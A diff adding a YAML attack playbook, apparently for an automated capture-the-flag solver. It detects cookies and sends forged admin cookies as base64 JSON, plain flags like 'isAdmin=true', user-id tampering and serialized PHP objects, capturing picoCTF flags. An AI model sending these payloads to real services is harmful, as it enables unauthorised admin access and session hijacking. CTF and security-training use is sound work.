@@ -1,0 +1,181 @@
+id: web_cookie_manipulation
+name: Cookie Manipulation and Session Hijacking
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits insecure cookie handling including base64 encoded cookies,
+  serialized objects, admin flags, and role-based access control bypasses.
+
+applies_when:
+  - "context.challenge.type == 'web'"
+
+confidence_seeds:
+  - if: "any('cookie' in p.lower() or 'session' in p.lower() for p in context.params)"
+    boost: 0.45
+    label: "Cookie or session parameter detected"
+  - if: "any(p in context.found_paths for p in ['/login', '/admin', '/profile', '/dashboard'])"
+    boost: 0.30
+    label: "Authentication-related path found"
+  - if: "'Set-Cookie' in context.response_headers"
+    boost: 0.35
+    label: "Cookie set in response"
+
+detection:
+  min_confidence: 0.10
+  paths:
+    - id: cookie_presence_check
+      name: "Cookie Detection"
+      steps:
+        - id: identify_cookies
+          action: http_probe
+          with:
+            payloads: []
+            inject_into: none
+          signals:
+            - match: "Set-Cookie:|Cookie:"
+              on_match:
+                confidence_boost: 0.50
+                emit: cookies_found
+
+    - id: base64_cookie_check
+      name: "Base64 Encoded Cookie Detection"
+      steps:
+        - id: decode_cookies
+          action: http_probe
+          with:
+            payloads: []
+            inject_into: none
+          signals:
+            - match: "^[A-Za-z0-9+/=]{20,}$"
+              on_match:
+                confidence_boost: 0.70
+                emit: base64_cookie_found
+
+    - id: json_cookie_check
+      name: "JSON Cookie Detection"
+      steps:
+        - id: parse_json_cookie
+          action: http_probe
+          with:
+            payloads: []
+            inject_into: none
+          signals:
+            - match: "\\{.*admin.*:|\\{.*role.*:|\\{.*user.*:"
+              on_match:
+                confidence_boost: 0.75
+                emit: json_cookie_found
+
+exploitation:
+  stop_on_flag: true
+  paths:
+    - id: base64_cookie_manipulation
+      name: "Base64 Cookie Manipulation"
+      requires_signal: base64_cookie_found
+      technique: cookie_decode_modify_encode
+      steps:
+        - id: modify_base64_cookie
+          action: http_probe
+          with:
+            payloads:
+              - "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ=="
+              - "eyJhZG1pbiI6dHJ1ZX0="
+              - "eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0="
+              - "YWRtaW4="
+            inject_into: cookie
+          capture:
+            - pattern: 'picoCTF\\{[^}]+\\}'
+              as: flag_value
+            - pattern: 'flag\\{[^}]+\\}'
+              as: flag_value
+
+    - id: json_cookie_manipulation
+      name: "JSON Cookie Manipulation"
+      requires_signal: json_cookie_found
+      technique: json_modification
+      steps:
+        - id: modify_json_fields
+          action: http_probe
+          with:
+            payloads:
+              - '{"user":"admin","role":"admin"}'
+              - '{"username":"admin","admin":true}'
+              - '{"role":"admin","isAdmin":true}'
+              - '{"user":"admin","isAdmin":1}'
+              - '{"admin":true}'
+              - '{"role":"administrator"}'
+            inject_into: cookie
+          capture:
+            - pattern: 'picoCTF\\{[^}]+\\}'
+              as: flag_value
+
+    - id: cookie_value_tampering
+      name: "Direct Cookie Value Tampering"
+      requires_signal: cookies_found
+      technique: value_modification
+      steps:
+        - id: tamper_values
+          action: http_probe
+          with:
+            payloads:
+              - "admin=1"
+              - "admin=true"
+              - "role=admin"
+              - "isAdmin=1"
+              - "isAdmin=true"
+              - "user=admin"
+              - "username=admin"
+              - "auth=admin"
+              - "level=admin"
+              - "privilege=admin"
+            inject_into: cookie
+          capture:
+            - pattern: 'picoCTF\\{[^}]+\\}'
+              as: flag_value
+
+    - id: cookie_integer_overflow
+      name: "Cookie Integer Manipulation"
+      requires_signal: cookies_found
+      technique: integer_manipulation
+      steps:
+        - id: overflow_values
+          action: http_probe
+          with:
+            payloads:
+              - "user_id=0"
+              - "user_id=1"
+              - "user_id=-1"
+              - "user_id=999999"
+              - "level=999"
+              - "role=0"
+            inject_into: cookie
+          capture:
+            - pattern: 'picoCTF\\{[^}]+\\}'
+              as: flag_value
+
+    - id: serialized_cookie_exploit
+      name: "Serialized Cookie Exploitation"
+      requires_signal: cookies_found
+      technique: deserialization_attack
+      steps:
+        - id: detect_serialization
+          action: http_probe
+          with:
+            payloads: []
+            inject_into: none
+          signals:
+            - match: "O:[0-9]+:|a:[0-9]+:|s:[0-9]+:|Tzo="
+              on_match:
+                confidence_boost: 0.80
+                emit: serialized_cookie_found
+
+        - id: exploit_deserialization
+          action: http_probe
+          with:
+            payloads:
+              - 'O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}'
+              - 'a:2:{s:4:"user";s:5:"admin";s:5:"admin";b:1;}'
+            inject_into: cookie
+          capture:
+            - pattern: 'picoCTF\\{[^}]+\\}'
+              as: flag_value
